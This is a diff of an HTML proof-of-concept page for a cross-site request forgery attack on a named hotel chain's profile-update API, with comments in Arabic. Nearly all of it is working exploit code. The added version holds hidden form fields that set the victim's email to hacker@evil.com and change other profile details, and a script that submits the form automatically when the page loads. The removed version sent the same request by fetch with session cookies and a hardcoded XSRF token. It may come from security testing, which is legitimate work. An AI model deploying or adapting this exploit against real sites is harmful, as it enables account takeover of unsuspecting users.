@@ -1,32 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Exploit - Motel6</title>
+    <title>CSRF PoC - Motel6 Profile Update</title>
 </head>
 <body>
+    <h2>CSRF Attack in Progress...</h2>
+    
+    <!-- بما إن الـ Form التقليدية تدعم GET و POST فقط، بنبعت البيانات لـ POST، 
+         ولو السيرفر بيقبل Method Override أو بيقبل POST كبديل، هيتم معالجة الطلب -->
     <form id="csrfForm" action="https://www.motel6.com/api/pwa/updateUsersProfile" method="POST">
+        <input type="hidden" name="devise_role" value="Consumer_Guest">
+        <input type="hidden" name="phone" value="1022546855">
+        <input type="hidden" name="country_code" value="+20">
+        <input type="hidden" name="country_iso_code" value="EG">
+        <input type="hidden" name="first_name" value="Hacker">
+        <input type="hidden" name="last_name" value="Victim">
+        <input type="hidden" name="userId" value="286014022">
+        <input type="hidden" name="email" value="hacker@evil.com">
     </form>
 
     <script>
-        async function exploit() {
-            try {
-                const response = await fetch('https://www.motel6.com/api/pwa/updateUsersProfile', {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Xsrf-Token': 'ag0kYw2Z-se7Irm-qQ37s3FJcDsmARj8YINU' 
-                    },
-                    credentials: 'include', // عشان يبعت الـ Cookies والـ Session معاها أوتوماتيك
-                    body: 'devise_role=Consumer_Guest&phone=1022546855&country_code=%2b20&country_iso_code=EG&first_name=Hacker&last_name=Victim&userId=286014022&email=hacker@evil.com'
-                });
-                
-                const result = await response.text();
-                console.log("Exploit sent successfully:", result);
-            } catch (error) {
-                console.error("Error:", error);
-            }
+        // تنفيذ الفورم أوتوماتيك بمجرد فتح الصفحة
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
         }
-        exploit();
     </script>
 </body>
 </html>
